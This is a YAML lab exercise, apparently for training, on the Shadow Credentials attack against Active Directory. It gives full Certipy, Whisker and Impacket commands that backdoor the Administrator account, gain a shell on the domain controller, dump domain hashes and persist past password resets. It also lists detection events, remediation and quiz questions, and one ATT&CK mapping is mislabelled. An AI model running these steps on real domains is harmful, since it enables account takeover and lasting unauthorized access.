# Category: Active Directory Security - Advanced Persistence
name: "Shadow Credentials Attack via msDS-KeyCredentialLink"
id: "ad-shadow-creds-001"
category: "offensive_security"
subcategory: "active_directory"
difficulty: "expert"
estimated_time: "60 minutes"

description: |
  Abuse the msDS-KeyCredentialLink attribute to add a forged key credential
  to a target account, enabling passwordless authentication via PKINIT.
  Provides stealthy persistence that survives password resets and account lockouts.

learning_objectives:
  - Understand the msDS-KeyCredentialLink attribute and PKINIT authentication
  - Enumerate accounts with WriteProperty rights on msDS-KeyCredentialLink
  - Add shadow credentials to privileged accounts for persistence
  - Detect and remediate unauthorized key credential modifications

tools:
  - certipy
  - whisker
  - pywhisker
  - rubeus
  - impacket
  - bloodhound

prerequisites:
  - Valid domain credentials with WriteProperty on target account's msDS-KeyCredentialLink
  - Network access to domain controller (TCP 88, 389)
  - Understanding of Kerberos PKINIT and key credential concepts
  - Authorization for credential manipulation testing

steps:
  - id: step1
    phase: "reconnaissance"
    action: "Identify accounts with shadow credential abuse potential"
    commands:
      - "# BloodHound: Query for WriteProperty on msDS-KeyCredentialLink"
      - "# Import collected data and run: 'Find users who can add key credentials to Domain Admins'"
      - "# Certipy: Enumerate ACLs for key credential rights"
      - "certipy find -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] -acl -stdout | grep -i 'keycredential'"
      - "# PowerView: Check ACLs on target account"
      - "Get-DomainObjectAcl -Identity '[target_account]' -Domain [domain] -Server [dc_ip] | Where-Object {$_.ObjectType -eq 'ms-DS-KeyCredentialLink' -and $_.ActiveDirectoryRights -match 'WriteProperty'}"
    expected_output: "List of accounts with WriteProperty rights on msDS-KeyCredentialLink for privileged targets"
    detection: "LDAP queries filtering for ms-DS-KeyCredentialLink object type; BloodHound collection events"

  - id: step2
    phase: "exploitation"
    action: "Add shadow credential to target account using Certipy"
    commands:
      - "# Add key credential to Domain Admin account"
      - "certipy shadow auto -u '[username]@[domain]' -p '[password]' -account 'Administrator' -dc-ip [dc_ip]"
      - "# Output: New .pfx certificate for shadow authentication"
      - "ls -la Administrator_shadow.pfx"
      - "# Alternative: Use Whisker for manual key addition"
      - "whisker add -t '[target_account]' -u '[username]@[domain]' -p '[password]' -d [domain] -dc [dc_ip]"
    expected_output: "Certificate file enabling passwordless authentication as target account"
    compliance_mapping: ["MITRE ATT&CK T1098.001", "SOC 2 CC6.1"]

  - id: step3
    phase: "exploitation"
    action: "Authenticate using shadow credential via PKINIT"
    commands:
      - "# Certipy: Authenticate with shadow credential certificate"
      - "certipy auth -pfx Administrator_shadow.pfx -dc-ip [dc_ip] -username Administrator -domain [domain]"
      - "# Output: TGT (.ccache) and NTLM hash for target account"
      - "export KRB5CCNAME=Administrator.ccache"
      - "# Use TGT for lateral movement"
      - "impacket-psexec -k -no-pass '[domain]/Administrator@[dc_ip]'"
      - "# Or use recovered hash for pass-the-hash"
      - "impacket-secretsdump -hashes ':[admin_ntlm_hash]' '[domain]/Administrator@[dc_ip]' -just-dc"
    expected_output: "Interactive shell on domain controller or extracted domain credentials"
    risk_level: "critical"

  - id: step4
    phase: "post_exploitation"
    action: "Validate persistence survives password reset"
    commands:
      - "# Reset target account password (simulating defensive action)"
      - "net user Administrator '[new_password]' /domain"
      - "# Re-authenticate using shadow credential (should still work)"
      - "certipy auth -pfx Administrator_shadow.pfx -dc-ip [dc_ip] -username Administrator -domain [domain]"
      - "# Confirm access persists"
      - "impacket-wmiexec -k -no-pass '[domain]/Administrator@[dc_ip]' 'whoami'"
    expected_output: "Successful authentication after password reset, confirming shadow credential persistence"
    detection: "Event ID 4723/4724: Password change attempt; subsequent PKINIT auth from same source"

  - id: step5
    phase: "analysis"
    action: "Enumerate and audit existing shadow credentials"
    commands:
      - "# List all shadow credentials on target account"
      - "certipy shadow list -u '[username]@[domain]' -p '[password]' -account Administrator -dc-ip [dc_ip]"
      - "# Export key credential descriptors for forensic analysis"
      - "certipy shadow list -u '[username]@[domain]' -p '[password]' -account Administrator -dc-ip [dc_ip] -output /tmp/shadow_audit.json"
      - "# Check for unauthorized key credentials via LDAP"
      - "ldapsearch -H ldap://[dc_ip] -x -D '[username]@[domain]' -w '[password]' -b 'CN=Administrator,CN=Users,DC=[dc1],DC=[dc2]' 'ms-DS-KeyCredentialLink'"
    expected_output: "JSON/LDAP output showing all key credentials linked to target account"
    compliance_mapping: ["SOC 2 CC7.2", "NIST 800-53 AU-6"]

detection:
  network_indicators:
    - "LDAP modifications to ms-DS-KeyCredentialLink attribute on privileged accounts"
    - "PKINIT Kerberos authentication (Event ID 4768) for accounts with recent key credential changes"
    - "Authentication from systems that previously had no access to target account"
  log_indicators:
    - "Event ID 5136: Directory object modified (ms-DS-KeyCredentialLink attribute)"
    - "Event ID 4768: Kerberos TGT requested via PKINIT for privileged account"
    - "Event ID 4723/4724: Password change followed by immediate PKINIT authentication"
    - "Defender for Identity: Alert on suspicious ms-DS-KeyCredentialLink modifications"
  endpoint_indicators:
    - "Certipy shadow, Whisker, or pywhisker execution"
    - "New .pfx certificate files named with target account + shadow suffix"
    - "PowerShell history containing Get-DomainObjectAcl with ms-DS-KeyCredentialLink filter"

remediation:
  immediate:
    - "Audit and remove unauthorized ms-DS-KeyCredentialLink entries from privileged accounts"
    - "Restrict WriteProperty permissions on ms-DS-KeyCredentialLink to only necessary admin groups"
    - "Reset passwords for any accounts with suspicious shadow credentials"
  long_term:
    - "Implement regular ACL reviews for ms-DS-KeyCredentialLink using Certipy audit mode"
    - "Deploy Microsoft Defender for Identity with shadow credential detection rules"
    - "Enable advanced auditing for Directory Service Changes (Event ID 5136)"
    - "Document key credential management procedures as part of SOC 2 CC6.1 evidence"
    - "Consider disabling ms-DS-KeyCredentialLink write access for non-PKI-administrators"

compliance_controls:
  - standard: "MITRE ATT&CK"
    control: "T1098.001"
    description: "Additional Cloud Credentials: SSH Keys (includes on-prem key credential abuse)"
  - standard: "SOC 2 Type II"
    control: "CC6.1"
    description: "Logical access controls prevent unauthorized credential manipulation"
  - standard: "NIST 800-53 Rev. 5"
    control: "AC-6"
    description: "Least privilege — restrict write access to sensitive directory attributes"
  - standard: "CIS Microsoft Windows Server Benchmark"
    control: "18.9.14.1"
    description: "Audit: Directory Service Changes"

variables:
  domain: "corp.example.com"
  dc1: "corp"
  dc2: "example"
  dc_ip: "192.168.1.10"
  username: "jsmith"
  password: "Password123"
  target_account: "Administrator"
  admin_ntlm_hash: "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
  new_password: "TempReset123!"

assessment_questions:
  - "What Active Directory attribute enables shadow credential attacks?"
  - "Why do shadow credentials persist after password resets?"
  - "How can BloodHound help identify shadow credential abuse paths?"
  - "Which Event ID is most critical for detecting unauthorized key credential additions?"
  - "What is the difference between shadow credentials and traditional password-based persistence?"

references:
  - url: "https://github.com/ly4k/Certipy"
    title: "Certipy - Shadow Credentials Module"
  - url: "https://github.com/eladshamir/Whisker"
    title: "Whisker - msDS-KeyCredentialLink Abuse Tool"
  - url: "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab"
    title: "Shadow Credentials: Abusing Key Trust Account Mapping - SpecterOps"
  - url: "https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-keycredentiallink"
    title: "ms-DS-KeyCredentialLink Attribute Documentation"